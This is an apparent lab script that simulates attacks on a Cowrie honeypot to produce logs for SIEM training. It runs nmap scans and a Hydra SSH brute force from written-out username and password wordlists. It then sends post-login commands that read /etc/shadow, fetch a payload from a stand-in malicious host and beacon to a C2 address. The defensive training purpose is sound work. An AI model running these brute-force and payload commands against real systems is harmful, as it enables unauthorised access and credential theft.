#!/bin/bash
# ============================================================================
# Attack Simulation Script
# Virtual Honeypot Security Monitoring Lab
# ============================================================================
# Run this script on the Kali Linux VM to simulate real-world attack patterns
# against the Cowrie honeypot. Generates log data for SIEM analysis.
# ============================================================================

set -e

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

HONEYPOT_IP="10.0.0.10"
SSH_PORT=22

echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}  Attack Simulation Suite${NC}"
echo -e "${CYAN}  Target: ${HONEYPOT_IP}${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# --- Check tools ---
echo -e "${YELLOW}[PREFLIGHT] Checking required tools...${NC}"
for tool in nmap hydra sshpass; do
    if command -v $tool &> /dev/null; then
        echo -e "  ${GREEN}[✓] $tool${NC}"
    else
        echo -e "  ${RED}[✗] $tool not found. Install with: apt install $tool${NC}"
        exit 1
    fi
done
echo ""

# --- Create wordlists ---
echo -e "${YELLOW}[SETUP] Creating attack wordlists...${NC}"

# Common usernames
cat > /tmp/usernames.txt << 'EOF'
root
admin
ubuntu
pi
user
test
guest
oracle
postgres
mysql
ftp
www-data
administrator
deploy
ansible
ec2-user
centos
vagrant
EOF

# Common passwords (top dictionary entries)
cat > /tmp/passwords.txt << 'EOF'
123456
password
admin
root
12345678
qwerty
abc123
letmein
monkey
master
dragon
login
princess
welcome
shadow
sunshine
trustno1
iloveyou
batman
access
hello
charlie
password1
toor
changeme
pass123
test123
P@ssw0rd
default
server
EOF

echo -e "${GREEN}  [✓] Wordlists created (${NC}$(wc -l < /tmp/usernames.txt)${GREEN} users, ${NC}$(wc -l < /tmp/passwords.txt)${GREEN} passwords)${NC}"
echo ""

# ============================================================================
# PHASE 1: RECONNAISSANCE
# ============================================================================
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  PHASE 1: RECONNAISSANCE${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# --- Ping Sweep ---
echo -e "${YELLOW}[1/3] Network Discovery (Ping Sweep)...${NC}"
nmap -sn 10.0.0.0/24 -oN /tmp/ping-sweep.txt 2>/dev/null
echo -e "${GREEN}  [✓] Ping sweep complete${NC}"

# --- Port Scan ---
echo -e "${YELLOW}[2/3] Port Scan (SYN Scan)...${NC}"
nmap -sS -p 1-1000 $HONEYPOT_IP -oN /tmp/port-scan.txt 2>/dev/null
echo -e "${GREEN}  [✓] Port scan complete${NC}"

# --- Service Detection ---
echo -e "${YELLOW}[3/3] Service Version Detection...${NC}"
nmap -sV -p 22,23,80,443,8080 $HONEYPOT_IP -oN /tmp/service-scan.txt 2>/dev/null
echo -e "${GREEN}  [✓] Service detection complete${NC}"
echo ""

# Display results
echo -e "${CYAN}  Scan Results:${NC}"
grep "open" /tmp/port-scan.txt 2>/dev/null || echo "  No open ports detected"
echo ""

# ============================================================================
# PHASE 2: BRUTE-FORCE AUTHENTICATION
# ============================================================================
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  PHASE 2: BRUTE-FORCE AUTHENTICATION${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${YELLOW}[1/1] SSH Brute-Force Attack (Hydra)...${NC}"
echo "  Target: ${HONEYPOT_IP}:${SSH_PORT}"
echo "  Users:  /tmp/usernames.txt"
echo "  Passwords: /tmp/passwords.txt"
echo ""

hydra -L /tmp/usernames.txt -P /tmp/passwords.txt \
    ssh://${HONEYPOT_IP}:${SSH_PORT} \
    -t 4 -w 3 -f \
    -o /tmp/hydra-results.txt 2>/dev/null || true

echo -e "${GREEN}  [✓] Brute-force simulation complete${NC}"
echo ""

# Display results
if [ -f /tmp/hydra-results.txt ]; then
    echo -e "${CYAN}  Hydra Results:${NC}"
    cat /tmp/hydra-results.txt
    echo ""
fi

# ============================================================================
# PHASE 3: INTERACTIVE SESSION
# ============================================================================
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  PHASE 3: INTERACTIVE SESSION SIMULATION${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${YELLOW}[1/1] Executing post-auth commands via SSH...${NC}"

# Simulate attacker interaction (these will be logged by Cowrie)
COMMANDS=(
    "uname -a"
    "whoami"
    "id"
    "cat /etc/passwd"
    "cat /etc/shadow"
    "ifconfig"
    "netstat -tlnp"
    "ps aux"
    "ls -la /root"
    "wget http://malicious-server.example.com/payload.sh"
    "curl http://10.0.0.99/c2-beacon"
    "history"
)

for cmd in "${COMMANDS[@]}"; do
    echo "  Executing: $cmd"
    sshpass -p "root" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 root@${HONEYPOT_IP} "$cmd" 2>/dev/null || true
    sleep 1  # Simulate human-like timing
done

echo -e "${GREEN}  [✓] Interactive session simulation complete${NC}"
echo ""

# ============================================================================
# SUMMARY
# ============================================================================
echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}  Attack Simulation Complete!${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""
echo "  Results saved to:"
echo "  • /tmp/ping-sweep.txt"
echo "  • /tmp/port-scan.txt"
echo "  • /tmp/service-scan.txt"
echo "  • /tmp/hydra-results.txt"
echo ""
echo "  Check Cowrie logs on the honeypot:"
echo "  tail -f /opt/cowrie/var/log/cowrie/cowrie.json"
echo ""
echo "  Check Kibana dashboard on the SIEM server:"
echo "  http://10.0.0.30:5601"
echo ""
echo -e "${GREEN}[✓] All attack phases completed successfully.${NC}"
